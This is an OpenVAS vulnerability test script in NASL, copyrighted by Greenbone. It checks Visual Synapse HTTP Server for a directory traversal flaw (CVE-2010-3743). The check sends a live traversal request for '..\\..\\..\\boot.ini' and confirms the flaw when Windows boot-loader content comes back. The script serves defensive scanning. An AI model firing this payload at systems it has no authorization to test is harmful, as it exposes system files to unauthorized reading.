###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vshttp_server_dir_traversal_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Visual Synapse HTTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to launch directory traversal
  attack and gain sensitive information about the remote system's directory
  contents.
  Impact Level: System/Application";
tag_affected = "Visual Synapse HTTP Server 1.0 RC3, 1.0 RC2, 1.0 RC1 and 0.60 and prior";
tag_insight = "An input validation error is present in the server which fails to validate
  user supplied request URI containing 'dot dot' sequences (/..\).";
tag_solution = "No solution or patch is available as of 18th October, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/visualsynapse/";
tag_summary = "This host is running Visual Synapse HTTP Server and is prone to directory
  traversal vulnerability.";

if(description)
{
  script_id(801526);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-10-18 15:37:53 +0200 (Mon, 18 Oct 2010)");
  script_cve_id("CVE-2010-3743");
  script_bugtraq_id(43830);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Visual Synapse HTTP Server Directory Traversal Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15216/");
  script_xref(name : "URL" , value : "http://www.syhunt.com/?n=Advisories.Vs-httpd-dirtrav");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/514167/100/0/threaded");

  script_description(desc);
  script_summary("Check directory traversal attack on Visual Synapse HTTP Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

vshttpsPort = get_http_port(default:80);
if(!vshttpsPort){
  exit(0);
}

## Construct the request
sndReq = string("GET / \r\n",
                "Host: ", get_host_name(), "\r\n\r\n");
rcvRes = http_keepalive_send_recv(port:vshttpsPort, data:sndReq);

## Confirm the Visual Synapse HTTP Server running
if("Visual Synapse HTTP Server" >< rcvRes)
{
  ##  Construct the Attack request
  attack = string("GET /..\\..\\..\\boot.ini HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n\r\n");
  rcvRes = http_keepalive_send_recv(port:vshttpsPort, data:attack);

  ## Confirm the exploit
  if(egrep(pattern:"HTTP/.* 200 Ok", string:rcvRes) &&
    ("\WINDOWS" >< rcvRes) && ("boot loader"  >< rcvRes)){
    security_warning(port:vshttpsPort);
  }
}
